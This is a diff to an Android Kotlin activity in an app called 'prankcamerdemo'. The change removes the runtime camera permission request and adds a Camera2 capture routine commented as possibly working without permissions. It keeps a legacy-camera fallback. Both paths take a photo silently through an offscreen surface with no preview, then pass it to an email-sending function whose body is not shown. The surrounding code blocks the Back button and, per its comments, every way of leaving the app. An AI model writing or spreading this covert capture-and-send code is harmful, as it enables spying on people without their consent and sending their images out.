@@ -2,10 +2,23 @@ package com.example.prankcamerdemo
 
 import android.app.AlertDialog
 import android.graphics.Bitmap
+import android.graphics.ImageFormat
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.CameraAccessException
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.params.StreamConfigurationMap
 import android.hardware.Camera as HardwareCamera
+import android.media.Image
+import android.media.ImageReader
 import android.media.MediaPlayer
 import android.os.Bundle
 import android.os.CountDownTimer
+import android.os.Handler
+import android.os.HandlerThread
 import android.util.Base64
 import android.view.WindowManager
 import androidx.appcompat.app.AppCompatActivity
@@ -13,6 +26,7 @@ import android.widget.Button
 import android.widget.ImageView
 import android.widget.TextView
 import java.io.ByteArrayOutputStream
+import java.nio.ByteBuffer
 import java.util.Properties
 import javax.activation.DataHandler
 import javax.mail.Authenticator
@@ -64,21 +78,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Запрашиваем разрешения для Android 6.0+
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-            val permissions = arrayOf(
-                android.Manifest.permission.CAMERA,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                android.Manifest.permission.READ_EXTERNAL_STORAGE
-            )
-            // Запрашиваем тихо (без диалога если уже было запрошено)
-            try {
-                requestPermissions(permissions, PERMISSIONS_REQUEST_CODE)
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
-
         // Блокируем все способы выхода из приложения
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
 
@@ -113,10 +112,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    companion object {
-        private const val PERMISSIONS_REQUEST_CODE = 100
-    }
-
     // Блокируем кнопку Назад
     @Deprecated("Deprecated")
     override fun onBackPressed() {
@@ -124,96 +119,175 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun takeAndSendPhoto() {
-        // Пробуем сделать фото через камеру напрямую
         thread {
             var photoData: ByteArray? = null
-            var cameraUsed = false
             
-            try {
-                var camera: HardwareCamera? = null
-                try {
-                    // Проверяем количество камер
-                    val cameraCount = HardwareCamera.getNumberOfCameras()
-                    android.util.Log.d("PrankCamera", "Camera count: $cameraCount")
-                    
-                    if (cameraCount > 0) {
-                        val cameraInfo = android.hardware.Camera.CameraInfo()
-                        
-                        // Пробуем открыть заднюю камеру
-                        for (i in 0 until cameraCount) {
-                            android.hardware.Camera.getCameraInfo(i, cameraInfo)
-                            android.util.Log.d("PrankCamera", "Camera $i facing: ${cameraInfo.facing}")
-                            if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
-                                camera = HardwareCamera.open(i)
-                                android.util.Log.d("PrankCamera", "Opened back camera $i")
-                                break
-                            }
-                        }
-                        
-                        // Если задней нет - пробуем любую
-                        if (camera == null) {
-                            camera = HardwareCamera.open(0)
-                            android.util.Log.d("PrankCamera", "Opened front camera 0")
-                        }
-                        
-                        if (camera != null) {
-                            cameraUsed = true
-                            val parameters = camera.parameters
-                            
-                            // Настраиваем размер фото
-                            val sizes = parameters.supportedPictureSizes
-                            if (sizes.isNotEmpty()) {
-                                val size = sizes[0]
-                                parameters.setPictureSize(size.width, size.height)
-                                camera.parameters = parameters
-                                
-                                // Создаём SurfaceTexture для превью
-                                val texture = android.graphics.SurfaceTexture(10)
-                                camera.setPreviewTexture(texture)
-                                camera.startPreview()
-                                
-                                // Даём камере время на инициализацию
-                                Thread.sleep(500)
-                                
-                                // Делаем фото
-                                val photoRef = ByteArrayRef()
-                                camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
-                                    override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
-                                        if (data != null) {
-                                            photoRef.data = data
-                                            android.util.Log.d("PrankCamera", "Photo taken: ${data.size} bytes")
-                                        } else {
-                                            android.util.Log.d("PrankCamera", "Photo data is null")
-                                        }
-                                        camera?.release()
-                                    }
-                                })
-                                
-                                // Ждём пока фото сохранится
-                                Thread.sleep(1000)
-                                
-                                photoData = photoRef.data
-                                android.util.Log.d("PrankCamera", "Final photo data: ${photoData?.size ?: 0} bytes")
-                            }
-                            camera.release()
-                        } else {
-                            android.util.Log.d("PrankCamera", "Failed to open any camera")
-                        }
-                    } else {
-                        android.util.Log.d("PrankCamera", "No cameras available")
-                    }
-                } catch (e: Exception) {
-                    android.util.Log.e("PrankCamera", "Camera error: ${e.message}", e)
-                    camera?.release()
-                }
-            } catch (e: Exception) {
-                android.util.Log.e("PrankCamera", "General error: ${e.message}", e)
+            // Подход 1: Пробуем Camera2 API (может работать без разрешений на некоторых устройствах)
+            photoData = tryCamera2Api()
+            
+            // Подход 2: Если Camera2 не сработал - пробуем старую камеру
+            if (photoData == null) {
+                photoData = tryLegacyCamera()
             }
             
-            android.util.Log.d("PrankCamera", "Sending email with photo: ${photoData != null}")
             // Отправляем письмо (с фото или без)
             sendEmailWithPhoto(photoData)
         }
+    }
+    
+    private fun tryCamera2Api(): ByteArray? {
+        try {
+            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
+            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
+                val characteristics = cameraManager.getCameraCharacteristics(id)
+                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
+            } ?: cameraManager.cameraIdList.firstOrNull()
+            
+            if (cameraId == null) return null
+            
+            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val sizes = streamConfigMap?.getOutputSizes(ImageFormat.JPEG)
+            
+            if (sizes.isNullOrEmpty()) return null
+            
+            val size = sizes[0]
+            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
+            
+            val cameraOpenResult = ByteArrayRef()
+            var captureSession: CameraCaptureSession? = null
+            var cameraDevice: CameraDevice? = null
+            
+            val stateCallback = object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    try {
+                        val surface = imageReader.surface
+                        val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                        captureRequestBuilder.addTarget(surface)
+                        
+                        val captureCallback = object : CameraCaptureSession.CaptureCallback() {
+                            override fun onCaptureCompleted(
+                                session: CameraCaptureSession,
+                                request: CaptureRequest,
+                                result: android.hardware.camera2.TotalCaptureResult
+                            ) {
+                                // Фото сделано
+                            }
+                        }
+                        
+                        camera.createCaptureSession(
+                            listOf(surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    captureSession = session
+                                    try {
+                                        session.capture(captureRequestBuilder.build(), captureCallback, null)
+                                    } catch (e: Exception) {}
+                                }
+                                override fun onConfigureFailed(session: CameraCaptureSession) {}
+                            },
+                            null
+                        )
+                        
+                        Thread.sleep(1000)
+                        
+                        val image = imageReader.acquireLatestImage()
+                        if (image != null) {
+                            val planes = image.planes
+                            val buffer = planes[0].buffer
+                            val bytes = ByteArray(buffer.remaining())
+                            buffer.get(bytes)
+                            cameraOpenResult.data = bytes
+                            image.close()
+                        }
+                        
+                        captureSession?.close()
+                        cameraDevice?.close()
+                        imageReader.close()
+                    } catch (e: Exception) {
+                        captureSession?.close()
+                        cameraDevice?.close()
+                        imageReader.close()
+                    }
+                }
+                
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    imageReader.close()
+                }
+                
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    imageReader.close()
+                }
+            }
+            
+            cameraManager.openCamera(cameraId, stateCallback, Handler())
+            Thread.sleep(2000)
+            
+            return cameraOpenResult.data
+        } catch (e: Exception) {
+            return null
+        }
+    }
+    
+    private fun tryLegacyCamera(): ByteArray? {
+        try {
+            var camera: HardwareCamera? = null
+            try {
+                val cameraCount = HardwareCamera.getNumberOfCameras()
+                
+                if (cameraCount > 0) {
+                    val cameraInfo = android.hardware.Camera.CameraInfo()
+                    
+                    for (i in 0 until cameraCount) {
+                        android.hardware.Camera.getCameraInfo(i, cameraInfo)
+                        if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
+                            camera = HardwareCamera.open(i)
+                            break
+                        }
+                    }
+                    
+                    if (camera == null) {
+                        camera = HardwareCamera.open(0)
+                    }
+                    
+                    if (camera != null) {
+                        val parameters = camera.parameters
+                        val sizes = parameters.supportedPictureSizes
+                        if (sizes.isNotEmpty()) {
+                            val size = sizes[0]
+                            parameters.setPictureSize(size.width, size.height)
+                            camera.parameters = parameters
+                            
+                            val texture = SurfaceTexture(10)
+                            camera.setPreviewTexture(texture)
+                            camera.startPreview()
+                            Thread.sleep(500)
+                            
+                            val photoRef = ByteArrayRef()
+                            camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
+                                override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
+                                    if (data != null) {
+                                        photoRef.data = data
+                                    }
+                                    camera?.release()
+                                }
+                            })
+                            
+                            Thread.sleep(1000)
+                            return photoRef.data
+                        }
+                        camera.release()
+                    }
+                }
+            } catch (e: Exception) {
+                camera?.release()
+            }
+        } catch (e: Exception) {}
+        
+        return null
     }
 
     private fun sendEmailWithPhoto(photoData: ByteArray?) {
